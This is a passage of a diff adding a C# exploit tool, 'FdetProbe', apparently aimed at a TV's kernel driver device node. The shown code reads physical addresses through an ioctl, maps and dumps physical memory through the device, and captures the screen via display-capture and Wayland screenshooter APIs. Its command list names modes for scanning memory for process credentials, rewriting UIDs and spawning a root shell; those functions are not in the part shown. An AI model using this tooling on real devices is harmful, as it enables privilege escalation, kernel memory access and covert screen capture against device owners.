@@ -1,0 +1,2408 @@
+using System;
+using System.Diagnostics;
+using System.Globalization;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+internal static class FdetProbe
+{
+    private const string DevicePath = "/dev/sdp_pqe_fdet";
+    private const int OpenReadWrite = 2;
+    private const int OpenReadOnly = 0;
+    private const int OpenCreate = 64;
+    private const int ProtectRead = 1;
+    private const int ProtectWrite = 2;
+    private const int MapShared = 1;
+    private const int SysMmap2Arm = 192;
+    private const int PageSize = 4096;
+    private const int PrSetName = 15;
+    private const int RtldNow = 2;
+    private const int RtldGlobal = 256;
+    private const int WlShmFormatXrgb8888 = 1;
+    private const uint FdetGetDescriptor = 0xc0044601;
+
+    private struct CredentialLocation
+    {
+        public ulong TaskPhysical;
+        public int PointerRelative;
+        public uint VirtualAddress;
+        public ulong PhysicalAddress;
+        public int UidOffset;
+        public int UidRun;
+        public uint Usage;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct DisplayCaptureRequest
+    {
+        public int AppType;
+        public int CaptureMode;
+        public int CompressionType;
+        public int Quality;
+        public IntPtr DirectoryPath;
+        public IntPtr FileName;
+        public int Width;
+        public int Height;
+        public int ReturnWidth;
+        public int ReturnHeight;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
+        public byte[] ReturnPath;
+    }
+
+    private sealed class WaylandCaptureState
+    {
+        public uint ShmName;
+        public uint ShmVersion;
+        public uint OutputName;
+        public uint OutputVersion;
+        public uint ScreenshooterName;
+        public uint ScreenshooterVersion;
+        public int Width;
+        public int Height;
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate void RegistryGlobalDelegate(IntPtr data, IntPtr registry, uint name, IntPtr interfaceName, uint version);
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate void RegistryGlobalRemoveDelegate(IntPtr data, IntPtr registry, uint name);
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate void OutputGeometryDelegate(IntPtr data, IntPtr output, int x, int y, int physicalWidth, int physicalHeight, int subpixel, IntPtr make, IntPtr model, int transform);
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate void OutputModeDelegate(IntPtr data, IntPtr output, uint flags, int width, int height, int refresh);
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate void OutputDoneDelegate(IntPtr data, IntPtr output);
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate void OutputScaleDelegate(IntPtr data, IntPtr output, int factor);
+
+    private static readonly RegistryGlobalDelegate RegistryGlobalCallback = OnRegistryGlobal;
+    private static readonly RegistryGlobalRemoveDelegate RegistryGlobalRemoveCallback = OnRegistryGlobalRemove;
+    private static readonly OutputGeometryDelegate OutputGeometryCallback = OnOutputGeometry;
+    private static readonly OutputModeDelegate OutputModeCallback = OnOutputMode;
+    private static readonly OutputDoneDelegate OutputDoneCallback = OnOutputDone;
+    private static readonly OutputScaleDelegate OutputScaleCallback = OnOutputScale;
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern uint getuid();
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern uint geteuid();
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern uint getgid();
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern uint getegid();
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int getpid();
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int setresuid(uint realUid, uint effectiveUid, uint savedUid);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int setresgid(uint realGid, uint effectiveGid, uint savedGid);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int prctl(int option, IntPtr argument2, IntPtr argument3, IntPtr argument4, IntPtr argument5);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int open(string path, int flags);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int close(int fileDescriptor);
+
+    [DllImport("libc", EntryPoint = "pread64", SetLastError = true)]
+    private static extern IntPtr Pread64(int fileDescriptor, IntPtr buffer, UIntPtr count, long offset);
+
+    [DllImport("libc", EntryPoint = "mmap64", SetLastError = true)]
+    private static extern IntPtr Mmap64(IntPtr address, UIntPtr length, int protection, int flags, int fileDescriptor, long offset);
+
+    [DllImport("libc", EntryPoint = "syscall", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
+    private static extern IntPtr SyscallMmap2(int number, IntPtr address, UIntPtr length, int protection, int flags, int fileDescriptor, uint pageOffset);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int munmap(IntPtr address, UIntPtr length);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int ioctl(int fileDescriptor, uint request, IntPtr argument);
+
+    [DllImport("libc", SetLastError = true)]
+    private static extern int unlink(string path);
+
+    [DllImport("libc", EntryPoint = "open", SetLastError = true)]
+    private static extern int open3(string path, int flags, uint mode);
+
+    [DllImport("libdl.so.2", EntryPoint = "dlopen", SetLastError = true)]
+    private static extern IntPtr dlopen(string path, int flags);
+
+    [DllImport("libdl.so.2", EntryPoint = "dlsym", SetLastError = true)]
+    private static extern IntPtr dlsym(IntPtr handle, string symbol);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_display_connect", CallingConvention = CallingConvention.Cdecl)]
+    private static extern IntPtr WlDisplayConnect(string name);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_display_disconnect", CallingConvention = CallingConvention.Cdecl)]
+    private static extern void WlDisplayDisconnect(IntPtr display);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_display_roundtrip", CallingConvention = CallingConvention.Cdecl)]
+    private static extern int WlDisplayRoundtrip(IntPtr display);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_display_flush", CallingConvention = CallingConvention.Cdecl)]
+    private static extern int WlDisplayFlush(IntPtr display);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_proxy_add_listener", CallingConvention = CallingConvention.Cdecl)]
+    private static extern int WlProxyAddListener(IntPtr proxy, IntPtr implementation, IntPtr data);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_proxy_marshal_array_constructor_versioned", CallingConvention = CallingConvention.Cdecl)]
+    private static extern IntPtr WlProxyMarshalArrayConstructorVersioned(IntPtr proxy, uint opcode, IntPtr arguments, IntPtr interfacePointer, uint version);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_proxy_marshal_array", CallingConvention = CallingConvention.Cdecl)]
+    private static extern void WlProxyMarshalArray(IntPtr proxy, uint opcode, IntPtr arguments);
+
+    [DllImport("libwayland-client.so.0", EntryPoint = "wl_proxy_destroy", CallingConvention = CallingConvention.Cdecl)]
+    private static extern void WlProxyDestroy(IntPtr proxy);
+
+    [DllImport("libdisplay-capture-api.so.0", EntryPoint = "dc_request_capture_to_file_sync", CallingConvention = CallingConvention.Cdecl)]
+    private static extern int DcRequestCaptureToFileSync(ref DisplayCaptureRequest request);
+
+    public static int Main(string[] arguments)
+    {
+        string mode = arguments.Length == 0 ? "hello" : arguments[0];
+
+        try
+        {
+            switch (mode)
+            {
+                case "hello":
+                case "h":
+                    PrintHello();
+                    return 0;
+                case "open":
+                case "o":
+                    return WithDevice(fileDescriptor =>
+                    {
+                        Console.WriteLine("open ok fd={0}", fileDescriptor);
+                        return 0;
+                    });
+                case "mmap-untouched":
+                    return MmapUntouched(arguments);
+                case "mmap-read-checksum":
+                    return MmapReadChecksum(arguments);
+                case "mmap2-untouched":
+                case "m2":
+                    return Mmap2Untouched(arguments, ProtectRead, "mmap2 untouched");
+                case "mmap2-rw-untouched":
+                case "m2w":
+                    return Mmap2Untouched(arguments, ProtectRead | ProtectWrite, "mmap2 rw untouched");
+                case "same-write":
+                case "sw":
+                    return Mmap2SameWrite(arguments);
+                case "scan":
+                case "s":
+                    return ScanPhysical(arguments);
+                case "task-tag-scan":
+                case "ts":
+                    return TaskTagScan(arguments);
+                case "uid-run-scan":
+                case "urs":
+                    return UidRunScan(arguments);
+                case "self-cred-same-write":
+                case "scsw":
+                    return SelfCredSameWrite(arguments, false);
+                case "self-private-cred-same-write":
+                case "spcsw":
+                    return SelfCredSameWrite(arguments, true);
+                case "self-root-check":
+                case "src":
+                    return SelfRootCheck(arguments, true, null);
+                case "self-root-uid-check":
+                case "sruc":
+                    return SelfRootCheck(arguments, false, null);
+                case "self-root-system":
+                case "srs":
+                    return SelfRootSystem(arguments);
+                case "credential-uid-rewrite":
+                case "cur":
+                    return CredentialUidRewrite(arguments);
+                case "read-words":
+                case "rw":
+                    return ReadWords(arguments);
+                case "write-words-if":
+                case "wwi":
+                    return WriteWordsIf(arguments);
+                case "descriptor":
+                case "d":
+                    return ReadDescriptor();
+                case "dump-descriptor":
+                case "ddesc":
+                    return DumpDescriptorBuffer(arguments);
+                case "display-capture":
+                case "dcap":
+                    return DisplayCaptureToFile(arguments);
+                case "display-capture-loop":
+                case "dcapl":
+                    return DisplayCaptureLoop(arguments);
+                case "wayland-shot":
+                case "wshot":
+                    return WaylandShot(arguments);
+                case "pagemap-self":
+                case "pm":
+                    return PagemapSelf();
+                default:
+                    Console.Error.WriteLine("unknown mode: {0}", mode);
+                    Console.Error.WriteLine("modes: hello open mmap-untouched mmap-read-checksum mmap2-untouched mmap2-rw-untouched same-write scan task-tag-scan uid-run-scan self-cred-same-write self-private-cred-same-write self-root-check self-root-uid-check self-root-system credential-uid-rewrite read-words write-words-if descriptor dump-descriptor display-capture display-capture-loop wayland-shot pagemap-self");
+                    return 2;
+            }
+        }
+        catch (Exception exception)
+        {
+            Console.Error.WriteLine(exception.GetType().FullName);
+            Console.Error.WriteLine(exception.Message);
+            return 1;
+        }
+    }
+
+    private static void PrintHello()
+    {
+        Console.WriteLine("hello");
+        Console.WriteLine("uid={0}", getuid());
+        Console.WriteLine("pointer_size={0}", IntPtr.Size);
+        Console.WriteLine("framework={0}", RuntimeInformation.FrameworkDescription);
+        Console.WriteLine("architecture={0}", RuntimeInformation.ProcessArchitecture);
+    }
+
+    private static int MmapUntouched(string[] arguments)
+    {
+        long offset = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0;
+        ulong lengthValue = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 4096;
+        UIntPtr length = new UIntPtr(lengthValue);
+
+        return WithDevice(fileDescriptor =>
+        {
+            IntPtr address = Mmap64(IntPtr.Zero, length, ProtectRead, MapShared, fileDescriptor, offset);
+            if (address == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("mmap64 failed errno={0}", error);
+                return 1;
+            }
+
+            int unmapResult = munmap(address, length);
+            if (unmapResult != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("munmap failed errno={0}", error);
+                return 1;
+            }
+
+            Console.WriteLine("mmap untouched ok offset=0x{0:x} length=0x{1:x}", offset, lengthValue);
+            return 0;
+        });
+    }
+
+    private static int ReadDescriptor()
+    {
+        return WithDevice(fileDescriptor =>
+        {
+            if (!TryReadFdetDescriptor(fileDescriptor, out uint[] descriptor))
+            {
+                return 1;
+            }
+
+            for (int index = 0; index < descriptor.Length; index++)
+            {
+                Console.WriteLine("descriptor[{0}]=0x{1:x8}", index, descriptor[index]);
+            }
+
+            return 0;
+        });
+    }
+
+    private static int DumpDescriptorBuffer(string[] arguments)
+    {
+        if (arguments.Length < 2)
+        {
+            Console.Error.WriteLine("usage: ddesc output [slot]");
+            return 2;
+        }
+
+        string outputPath = arguments[1];
+        int slot = arguments.Length >= 3 ? (int)ParseInteger(arguments[2]) : 0;
+        if (slot < 0 || slot > 1)
+        {
+            Console.Error.WriteLine("slot must be 0 or 1");
+            return 2;
+        }
+
+        return WithDevice(fileDescriptor =>
+        {
+            if (!TryReadFdetDescriptor(fileDescriptor, out uint[] descriptor))
+            {
+                return 1;
+            }
+
+            int descriptorOffset = slot == 0 ? 0 : 3;
+            ulong physicalAddress = descriptor[descriptorOffset];
+            ulong yLength = descriptor[descriptorOffset + 1];
+            ulong chromaLength = descriptor[descriptorOffset + 2];
+            ulong totalLength = checked(yLength + chromaLength);
+            if (physicalAddress == 0 || totalLength == 0)
+            {
+                Console.Error.WriteLine("empty descriptor slot");
+                return 1;
+            }
+
+            ulong pageStart = physicalAddress & ~0xfffUL;
+            int pageOffset = checked((int)(physicalAddress - pageStart));
+            ulong mappedLength = AlignUp((ulong)pageOffset + totalLength, PageSize);
+            IntPtr mapping = MapPhysical(fileDescriptor, pageStart, mappedLength, ProtectRead);
+            if (mapping == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("descriptor mmap failed physical=0x{0:x} length=0x{1:x} errno={2}", pageStart, mappedLength, error);
+                return 1;
+            }
+
+            try
+            {
+                using (FileStream output = new FileStream(outputPath, FileMode.Create, FileAccess.Write, FileShare.Read))
+                {
+                    CopyMappedToFile(mapping, pageOffset, totalLength, output);
+                }
+            }
+            finally
+            {
+                munmap(mapping, new UIntPtr(mappedLength));
+            }
+
+            Console.WriteLine("dump_descriptor slot={0}", slot);
+            Console.WriteLine("physical=0x{0:x}", physicalAddress);
+            Console.WriteLine("y_bytes=0x{0:x}", yLength);
+            Console.WriteLine("chroma_bytes=0x{0:x}", chromaLength);
+            Console.WriteLine("total_bytes={0}", totalLength);
+            Console.WriteLine("output={0}", outputPath);
+            return 0;
+        });
+    }
+
+    private static bool TryReadFdetDescriptor(int fileDescriptor, out uint[] descriptor)
+    {
+        descriptor = new uint[6];
+        IntPtr buffer = Marshal.AllocHGlobal(24);
+        try
+        {
+            for (int index = 0; index < 24; index++)
+            {
+                Marshal.WriteByte(buffer, index, 0);
+            }
+
+            int result = ioctl(fileDescriptor, FdetGetDescriptor, buffer);
+            if (result != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("ioctl failed errno={0}", error);
+                return false;
+            }
+
+            for (int index = 0; index < descriptor.Length; index++)
+            {
+                descriptor[index] = unchecked((uint)Marshal.ReadInt32(buffer, index * 4));
+            }
+
+            return true;
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(buffer);
+        }
+    }
+
+    private static void CopyMappedToFile(IntPtr mapping, int pageOffset, ulong totalLength, FileStream output)
+    {
+        const int chunkLength = 65536;
+        byte[] buffer = new byte[chunkLength];
+        ulong copied = 0;
+        while (copied < totalLength)
+        {
+            int currentLength = checked((int)Math.Min((ulong)chunkLength, totalLength - copied));
+            IntPtr source = new IntPtr(mapping.ToInt64() + pageOffset + checked((long)copied));
+            Marshal.Copy(source, buffer, 0, currentLength);
+            output.Write(buffer, 0, currentLength);
+            copied += (ulong)currentLength;
+        }
+    }
+
+    private static ulong AlignUp(ulong value, int alignment)
+    {
+        ulong alignmentValue = (ulong)alignment;
+        return (value + alignmentValue - 1) & ~(alignmentValue - 1);
+    }
+
+    private static int DisplayCaptureToFile(string[] arguments)
+    {
+        if (arguments.Length < 5)
+        {
+            Console.Error.WriteLine("usage: dcap directory file_name app_type mode [compression] [width] [height] [quality]");
+            return 2;
+        }
+
+        string directoryPath = arguments[1];
+        string fileName = arguments[2];
+        int appType = (int)ParseInteger(arguments[3]);
+        int captureMode = (int)ParseInteger(arguments[4]);
+        int compressionType = arguments.Length >= 6 ? (int)ParseInteger(arguments[5]) : 0;
+        int width = arguments.Length >= 7 ? (int)ParseInteger(arguments[6]) : 960;
+        int height = arguments.Length >= 8 ? (int)ParseInteger(arguments[7]) : 540;
+        int quality = arguments.Length >= 9 ? (int)ParseInteger(arguments[8]) : 95;
+        int result = RequestDisplayCapture(directoryPath, fileName, appType, captureMode, compressionType, width, height, quality, out DisplayCaptureRequest request);
+        Console.WriteLine("display_capture_result={0}", result);
+        Console.WriteLine("app_type={0}", appType);
+        Console.WriteLine("capture_mode={0}", captureMode);
+        Console.WriteLine("compression_type={0}", compressionType);
+        Console.WriteLine("requested_width={0}", width);
+        Console.WriteLine("requested_height={0}", height);
+        Console.WriteLine("return_width={0}", request.ReturnWidth);
+        Console.WriteLine("return_height={0}", request.ReturnHeight);
+        Console.WriteLine("return_path={0}", ReadNullTerminatedAscii(request.ReturnPath));
+        return result == 0 ? 0 : 1;
+    }
+
+    private static int DisplayCaptureLoop(string[] arguments)
+    {
+        if (arguments.Length < 6)
+        {
+            Console.Error.WriteLine("usage: dcapl directory prefix app_type mode count [compression] [width] [height] [quality]");
+            return 2;
+        }
+
+        string directoryPath = arguments[1];
+        string prefix = arguments[2];
+        int appType = (int)ParseInteger(arguments[3]);
+        int captureMode = (int)ParseInteger(arguments[4]);
+        int count = (int)ParseInteger(arguments[5]);
+        int compressionType = arguments.Length >= 7 ? (int)ParseInteger(arguments[6]) : 0;
+        int width = arguments.Length >= 8 ? (int)ParseInteger(arguments[7]) : 960;
+        int height = arguments.Length >= 9 ? (int)ParseInteger(arguments[8]) : 540;
+        int quality = arguments.Length >= 10 ? (int)ParseInteger(arguments[9]) : 95;
+        if (count < 1 || count > 120)
+        {
+            Console.Error.WriteLine("count must be between 1 and 120");
+            return 2;
+        }
+
+        Stopwatch total = Stopwatch.StartNew();
+        int failed = 0;
+        for (int index = 1; index <= count; index++)
+        {
+            string fileName = prefix + "-" + index.ToString(CultureInfo.InvariantCulture);
+            Stopwatch frame = Stopwatch.StartNew();
+            int result = RequestDisplayCapture(directoryPath, fileName, appType, captureMode, compressionType, width, height, quality, out DisplayCaptureRequest request);
+            frame.Stop();
+            string returnPath = ReadNullTerminatedAscii(request.ReturnPath);
+            long size = File.Exists(returnPath) ? new FileInfo(returnPath).Length : 0;
+            Console.WriteLine("frame={0} result={1} capture_ms={2:F3} return_width={3} return_height={4} size={5} path={6}", index, result, frame.Elapsed.TotalMilliseconds, request.ReturnWidth, request.ReturnHeight, size, returnPath);
+            if (result != 0)
+            {
+                failed++;
+            }
+        }
+
+        total.Stop();
+        Console.WriteLine("frames={0}", count);
+        Console.WriteLine("failed={0}", failed);
+        Console.WriteLine("total_ms={0:F3}", total.Elapsed.TotalMilliseconds);
+        Console.WriteLine("average_ms={0:F3}", total.Elapsed.TotalMilliseconds / count);
+        return failed == 0 ? 0 : 1;
+    }
+
+    private static int RequestDisplayCapture(string directoryPath, string fileName, int appType, int captureMode, int compressionType, int width, int height, int quality, out DisplayCaptureRequest request)
+    {
+        IntPtr directoryPointer = Marshal.StringToHGlobalAnsi(directoryPath);
+        IntPtr fileNamePointer = Marshal.StringToHGlobalAnsi(fileName);
+        try
+        {
+            request = new DisplayCaptureRequest();
+            request.AppType = appType;
+            request.CaptureMode = captureMode;
+            request.CompressionType = compressionType;
+            request.Quality = quality;
+            request.DirectoryPath = directoryPointer;
+            request.FileName = fileNamePointer;
+            request.Width = width;
+            request.Height = height;
+            request.ReturnPath = new byte[256];
+            return DcRequestCaptureToFileSync(ref request);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(directoryPointer);
+            Marshal.FreeHGlobal(fileNamePointer);
+        }
+    }
+
+    private static string ReadNullTerminatedAscii(byte[] bytes)
+    {
+        int length = 0;
+        while (length < bytes.Length && bytes[length] != 0)
+        {
+            length++;
+        }
+
+        return Encoding.ASCII.GetString(bytes, 0, length);
+    }
+
+    private static int WaylandShot(string[] arguments)
+    {
+        if (arguments.Length < 2)
+        {
+            Console.Error.WriteLine("usage: wshot output_raw [socket] [width] [height]");
+            return 2;
+        }
+
+        string outputPath = arguments[1];
+        string socketName = arguments.Length >= 3 ? arguments[2] : "wayland-0";
+        int requestedWidth = arguments.Length >= 4 ? (int)ParseInteger(arguments[3]) : 0;
+        int requestedHeight = arguments.Length >= 5 ? (int)ParseInteger(arguments[4]) : 0;
+        IntPtr waylandHandle = dlopen("libwayland-client.so.0", RtldNow | RtldGlobal);
+        IntPtr screenshooterHandle = dlopen("libscreenshooter-client.so.0", RtldNow | RtldGlobal);
+        if (waylandHandle == IntPtr.Zero || screenshooterHandle == IntPtr.Zero)
+        {
+            Console.Error.WriteLine("dlopen wayland failed");
+            return 1;
+        }
+
+        IntPtr wlShmInterface = dlsym(waylandHandle, "wl_shm_interface");
+        IntPtr wlShmPoolInterface = dlsym(waylandHandle, "wl_shm_pool_interface");
+        IntPtr wlBufferInterface = dlsym(waylandHandle, "wl_buffer_interface");
+        IntPtr wlRegistryInterface = dlsym(waylandHandle, "wl_registry_interface");
+        IntPtr wlOutputInterface = dlsym(waylandHandle, "wl_output_interface");
+        IntPtr screenshooterInterface = dlsym(screenshooterHandle, "screenshooter_interface");
+        if (wlShmInterface == IntPtr.Zero || wlShmPoolInterface == IntPtr.Zero || wlBufferInterface == IntPtr.Zero || wlRegistryInterface == IntPtr.Zero || wlOutputInterface == IntPtr.Zero || screenshooterInterface == IntPtr.Zero)
+        {
+            Console.Error.WriteLine("dlsym wayland interfaces failed");
+            return 1;
+        }
+
+        IntPtr display = WlDisplayConnect(socketName);
+        if (display == IntPtr.Zero)
+        {
+            Console.Error.WriteLine("wl_display_connect failed socket={0}", socketName);
+            return 1;
+        }
+
+        WaylandCaptureState state = new WaylandCaptureState();
+        GCHandle stateHandle = GCHandle.Alloc(state);
+        IntPtr registryListener = IntPtr.Zero;
+        IntPtr outputListener = IntPtr.Zero;
+        IntPtr registry = IntPtr.Zero;
+        IntPtr shm = IntPtr.Zero;
+        IntPtr output = IntPtr.Zero;
+        IntPtr screenshooter = IntPtr.Zero;
+        IntPtr pool = IntPtr.Zero;
+        IntPtr buffer = IntPtr.Zero;
+        int fileDescriptor = -1;
+        IntPtr mapping = IntPtr.Zero;
+        ulong bufferSize = 0;
+        string sharedMemoryPath = "/tmp/qn90b-wayland-shot-" + getpid().ToString(CultureInfo.InvariantCulture) + ".raw";
+        try
+        {
+            registry = GetWaylandRegistry(display, wlRegistryInterface);
+            if (registry == IntPtr.Zero)
+            {
+                Console.Error.WriteLine("wl_display_get_registry failed");
+                return 1;
+            }
+
+            registryListener = AllocateListener(Marshal.GetFunctionPointerForDelegate(RegistryGlobalCallback), Marshal.GetFunctionPointerForDelegate(RegistryGlobalRemoveCallback));
+            int listenerResult = WlProxyAddListener(registry, registryListener, GCHandle.ToIntPtr(stateHandle));
+            if (listenerResult != 0)
+            {
+                Console.Error.WriteLine("registry listener failed");
+                return 1;
+            }
+
+            WlDisplayRoundtrip(display);
+            Console.WriteLine("wl_global shm={0} output={1} screenshooter={2}", state.ShmName, state.OutputName, state.ScreenshooterName);
+            if (state.ShmName == 0 || state.OutputName == 0 || state.ScreenshooterName == 0)
+            {
+                Console.Error.WriteLine("required wayland globals missing");
+                return 1;
+            }
+
+            shm = BindRegistry(registry, state.ShmName, "wl_shm", wlShmInterface, MinimumVersion(state.ShmVersion, 1));
+            output = BindRegistry(registry, state.OutputName, "wl_output", wlOutputInterface, MinimumVersion(state.OutputVersion, 2));
+            screenshooter = BindRegistry(registry, state.ScreenshooterName, "screenshooter", screenshooterInterface, MinimumVersion(state.ScreenshooterVersion, 1));
+            if (shm == IntPtr.Zero || output == IntPtr.Zero || screenshooter == IntPtr.Zero)
+            {
+                Console.Error.WriteLine("wayland bind failed");
+                return 1;
+            }
+
+            outputListener = AllocateListener(
+                Marshal.GetFunctionPointerForDelegate(OutputGeometryCallback),
+                Marshal.GetFunctionPointerForDelegate(OutputModeCallback),
+                Marshal.GetFunctionPointerForDelegate(OutputDoneCallback),
+                Marshal.GetFunctionPointerForDelegate(OutputScaleCallback));
+            WlProxyAddListener(output, outputListener, GCHandle.ToIntPtr(stateHandle));
+            WlDisplayRoundtrip(display);
+            int width = requestedWidth != 0 ? requestedWidth : state.Width;
+            int height = requestedHeight != 0 ? requestedHeight : state.Height;
+            if (width <= 0 || height <= 0)
+            {
+                width = 1920;
+                height = 1080;
+            }
+
+            int stride = checked(width * 4);
+            bufferSize = checked((ulong)stride * (ulong)height);
+            using (FileStream sharedMemoryFile = new FileStream(sharedMemoryPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
+            {
+                sharedMemoryFile.SetLength(checked((long)bufferSize));
+            }
+
+            fileDescriptor = open3(sharedMemoryPath, OpenReadWrite | OpenCreate, 384);
+            if (fileDescriptor < 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("open shm file failed errno={0}", error);
+                return 1;
+            }
+
+            mapping = Mmap64(IntPtr.Zero, new UIntPtr(bufferSize), ProtectRead | ProtectWrite, MapShared, fileDescriptor, 0);
+            if (mapping == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("mmap shm failed errno={0}", error);
+                mapping = IntPtr.Zero;
+                return 1;
+            }
+
+            pool = CreateWaylandPool(shm, wlShmPoolInterface, fileDescriptor, checked((int)bufferSize));
+            if (pool == IntPtr.Zero)
+            {
+                Console.Error.WriteLine("wl_shm create_pool failed");
+                return 1;
+            }
+
+            buffer = CreateWaylandBuffer(pool, wlBufferInterface, width, height, stride);
+            if (buffer == IntPtr.Zero)
+            {
+                Console.Error.WriteLine("wl_shm_pool create_buffer failed");
+                return 1;
+            }
+
+            ShootWaylandOutput(screenshooter, output, buffer);
+            WlDisplayFlush(display);
+            WlDisplayRoundtrip(display);
+            using (FileStream outputFile = new FileStream(outputPath, FileMode.Create, FileAccess.Write, FileShare.Read))
+            {
+                CopyMappedToFile(mapping, 0, bufferSize, outputFile);
+            }
+
+            Console.WriteLine("wayland_shot_output={0}", outputPath);
+            Console.WriteLine("width={0}", width);
+            Console.WriteLine("height={0}", height);
+            Console.WriteLine("stride={0}", stride);
+            Console.WriteLine("bytes={0}", bufferSize);
+            Console.WriteLine("pixel_format=xrgb8888");
+            return 0;
+        }
+        finally
+        {
+            if (buffer != IntPtr.Zero)
+            {
+                WlProxyDestroy(buffer);
+            }
+
+            if (pool != IntPtr.Zero)
+            {
+                WlProxyDestroy(pool);
+            }
+
+            if (mapping != IntPtr.Zero)
+            {
+                munmap(mapping, new UIntPtr(bufferSize));
+            }
+
+            if (fileDescriptor >= 0)
+            {
+                close(fileDescriptor);
+            }
+
+            if (screenshooter != IntPtr.Zero)
+            {
+                WlProxyDestroy(screenshooter);
+            }
+
+            if (output != IntPtr.Zero)
+            {
+                WlProxyDestroy(output);
+            }
+
+            if (shm != IntPtr.Zero)
+            {
+                WlProxyDestroy(shm);
+            }
+
+            if (registry != IntPtr.Zero)
+            {
+                WlProxyDestroy(registry);
+            }
+
+            if (display != IntPtr.Zero)
+            {
+                WlDisplayDisconnect(display);
+            }
+
+            if (registryListener != IntPtr.Zero)
+            {
+                Marshal.FreeHGlobal(registryListener);
+            }
+
+            if (outputListener != IntPtr.Zero)
+            {
+                Marshal.FreeHGlobal(outputListener);
+            }
+
+            stateHandle.Free();
+            unlink(sharedMemoryPath);
+        }
+    }
+
+    private static uint MinimumVersion(uint value, uint maximum)
+    {
+        if (value == 0)
+        {
+            return maximum;
+        }
+
+        return value < maximum ? value : maximum;
+    }
+
+    private static IntPtr AllocateListener(params IntPtr[] callbacks)
+    {
+        IntPtr listener = Marshal.AllocHGlobal(callbacks.Length * IntPtr.Size);
+        for (int index = 0; index < callbacks.Length; index++)
+        {
+            Marshal.WriteIntPtr(listener, index * IntPtr.Size, callbacks[index]);
+        }
+
+        return listener;
+    }
+
+    private static IntPtr BindRegistry(IntPtr registry, uint name, string interfaceName, IntPtr interfacePointer, uint version)
+    {
+        IntPtr arguments = Marshal.AllocHGlobal(4 * IntPtr.Size);
+        IntPtr interfaceNamePointer = Marshal.StringToHGlobalAnsi(interfaceName);
+        try
+        {
+            WriteWaylandArgument(arguments, 0, new IntPtr(unchecked((int)name)));
+            WriteWaylandArgument(arguments, 1, interfaceNamePointer);
+            WriteWaylandArgument(arguments, 2, new IntPtr(unchecked((int)version)));
+            WriteWaylandArgument(arguments, 3, IntPtr.Zero);
+            return WlProxyMarshalArrayConstructorVersioned(registry, 0, arguments, interfacePointer, version);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(interfaceNamePointer);
+            Marshal.FreeHGlobal(arguments);
+        }
+    }
+
+    private static IntPtr GetWaylandRegistry(IntPtr display, IntPtr registryInterface)
+    {
+        IntPtr arguments = Marshal.AllocHGlobal(IntPtr.Size);
+        try
+        {
+            WriteWaylandArgument(arguments, 0, IntPtr.Zero);
+            return WlProxyMarshalArrayConstructorVersioned(display, 1, arguments, registryInterface, 1);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(arguments);
+        }
+    }
+
+    private static IntPtr CreateWaylandPool(IntPtr shm, IntPtr poolInterface, int fileDescriptor, int size)
+    {
+        IntPtr arguments = Marshal.AllocHGlobal(3 * IntPtr.Size);
+        try
+        {
+            WriteWaylandArgument(arguments, 0, IntPtr.Zero);
+            WriteWaylandArgument(arguments, 1, new IntPtr(fileDescriptor));
+            WriteWaylandArgument(arguments, 2, new IntPtr(size));
+            return WlProxyMarshalArrayConstructorVersioned(shm, 0, arguments, poolInterface, 1);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(arguments);
+        }
+    }
+
+    private static IntPtr CreateWaylandBuffer(IntPtr pool, IntPtr bufferInterface, int width, int height, int stride)
+    {
+        IntPtr arguments = Marshal.AllocHGlobal(5 * IntPtr.Size);
+        try
+        {
+            WriteWaylandArgument(arguments, 0, IntPtr.Zero);
+            WriteWaylandArgument(arguments, 1, new IntPtr(width));
+            WriteWaylandArgument(arguments, 2, new IntPtr(height));
+            WriteWaylandArgument(arguments, 3, new IntPtr(stride));
+            WriteWaylandArgument(arguments, 4, new IntPtr(WlShmFormatXrgb8888));
+            return WlProxyMarshalArrayConstructorVersioned(pool, 0, arguments, bufferInterface, 1);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(arguments);
+        }
+    }
+
